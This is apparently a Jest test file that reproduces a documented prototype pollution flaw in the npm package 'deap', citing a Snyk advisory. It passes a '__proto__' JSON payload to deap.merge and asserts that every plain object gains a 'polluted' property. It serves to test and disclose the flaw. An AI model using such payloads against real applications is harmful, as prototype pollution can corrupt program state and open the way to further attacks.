//https://snyk.io/vuln/npm:deap:20180415
test("prototype pollution in deap", () => {
  const deap = require("deap");
  obj = {};
  let malicious_payload = '{"__proto__":{"polluted":"yes"}}';

  expect({}.polluted).toBe(undefined);

  deap.merge({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe("yes");
});
